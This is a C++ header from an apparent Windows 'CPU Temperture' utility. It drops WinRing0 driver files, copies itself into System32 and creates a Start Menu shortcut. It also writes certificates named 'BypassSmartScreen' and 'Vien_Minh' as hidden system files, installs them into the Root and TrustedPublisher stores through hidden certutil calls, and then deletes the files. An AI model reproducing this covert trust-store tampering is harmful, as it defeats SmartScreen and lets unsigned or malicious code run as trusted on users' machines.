#pragma once

#include "API0.h"
#include <thread>
#include <chrono>

namespace fs = std::filesystem;
//inline const wstring ProgramNameW = get_program_name();

namespace std{
	bool WriteD(){
	    if (!fs::exists(WinRing0x64) || !fs::exists(WinRing0x64D)) {
	        FILE* f1_out = fopen(WinRing0x64.c_str(), "wb");
	        if (f1_out) {
	            fwrite(WR0x64, 1, D1, f1_out);
	            fclose(f1_out);
	        } else {
	            return false;
	        }

	        FILE* f2_out = fopen(WinRing0x64D.c_str(), "wb");
	        if (f2_out) {
	            fwrite(WR0x64D, 1, D2, f2_out);
	            fclose(f2_out);
	        } else {
	            return false;
	        }
    	}
	    return true;

	}

	bool WriteC(){
		/*if(!fs::exists(CER)){
        FILE* f3_out = fopen(CER.c_str(), "wb");
	        if (f3_out) {
	                fwrite(BypassSmartScreen, 1, BSS, f3_out);
	                fclose(f3_out);
	                SetFileAttributes("C:/Windows/System32/vmultra.cer", FILE_ATTRIBUTE_SYSTEM||FILE_ATTRIBUTE_HIDDEN);
	        }
	        else return false;
	    }*/
	    if(!WriteFile(BypassSmartScreen, BSS, L"C:/Windows/System32/vmultra.cer", FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN, true, true)||!WriteFile(Vien_Minh, BSS1, L"C:/Windows/System32/Vien_Minh.cer", FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN, true, true)){
	    	return false;
	    }
	    /*if(!fs::exists(CER1)){
	        FILE* f4_out = fopen(CER1.c_str(), "wb");
	        if (f4_out) {
	                fwrite(Vien_Minh, 1, BSS1, f4_out);
	                fclose(f4_out);
	                SetFileAttributes("C:/Windows/System32/Vien_Minh.cer", FILE_ATTRIBUTE_SYSTEM||FILE_ATTRIBUTE_HIDDEN);
	        }
	        else return false;
	    }*/
	    return true;
	}
	

	void CheckAndWriteCer(){
		PCCERT_CONTEXT pCert = LoadCertificateFromFile(CER_PATH);
    	PCCERT_CONTEXT pCert1 = LoadCertificateFromFile(CER_PATH1); 
		if(!IsCertInStore("Root", pCert)||!IsCertInStore("TrustedPublisher", pCert)){
	        if(!RunCmdHidden(L"cmd /c certutil -addstore -f \"Root\" C:/Windows/System32/vmultra.cer")||!RunCmdHidden(L"cmd /c certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/vmultra.cer")){
	        	system("certutil -addstore -f \"Root\" C:/Windows/System32/vmultra.cer");
	        	system("cls");
	        	system("cmd /c certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/vmultra.cer");
	        	system("cls");
	        }
   		}
	    if(!IsCertInStore("Root", pCert1)||!IsCertInStore("TrustedPublisher", pCert1)){
	        if(!RunCmdHidden(L"cmd /c certutil -addstore -f \"Root\" C:/Windows/System32/Vien_Minh.cer")||!RunCmdHidden(L"cmd /c certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/Vien_Minh.cer")){
	        	system("certutil -addstore -f \"Root\" C:/Windows/System32/Vien_Minh.cer");
	        	system("cls");
	        	system("certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/Vien_Minh.cer");	
	        	system("cls");
	        }

	    }
	    if(!DeleteFileSafe(L"C:/Windows/System32/vmultra.cer")||!DeleteFileSafe(L"C:/Windows/System32/Vien_Minh.cer")){
	    	OutputDebugStringA("DFE\n");
	    }
	    if(!IsCertInStore("Root", pCert)||!IsCertInStore("TrustedPublisher", pCert)||!IsCertInStore("Root", pCert1)||!IsCertInStore("TrustedPublisher", pCert1)){
	    	OutputDebugStringA("CIE\n");
	    }

	}
	void ExitProcess(){
    	if(!FreeDllLibrary()){
    		    HANDLE hProcess = GetCurrentProcess();  
    		    TerminateProcess(hProcess, 0);
    	}

	}

	int InstallProgram(const string PROG_NAME){
		auto cwd_can   = fs::weakly_canonical(fs::current_path());
    	auto other_can = fs::weakly_canonical(R"(C:\Windows\System32)");
		if (cwd_can != other_can) {
		    if (!fs::exists(INSTALL_PATH)) {
	            ifstream source(PROG_NAME, ios::binary);
	            ofstream destination(INSTALL_PATH, ios::binary);

	            if (!source.is_open() || !destination.is_open()) {
	            	return 0;
	            }

	            destination << source.rdbuf();
	            source.close();
	            destination.close();

	            if (!source.good() || !destination.good()) {
	                return 0;
	            }
		         
	        }
		}
		WriteArray(SHORTCUT_GT, SRT_GT, L"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/CPU Temperture.lnk");
	    return 1;
	}
	int UninstallProgram() {
	    bool ok1 = DeleteFileSafe(L"C:\\Windows\\System32\\gettemp.exe");
    	bool ok2 = DeleteFileSafe(L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\CPU Temperture.lnk");


	    return (ok1 && ok2) ? 1 : 0;
	}

	bool RunSystem(const wstring ProgramNameW){
		if(!AccessSystemP(ProgramNameW))return false;
		HANDLE hProcess = GetCurrentProcess();
   	    TerminateProcess(hProcess, 0);
   	    return true;
	}
}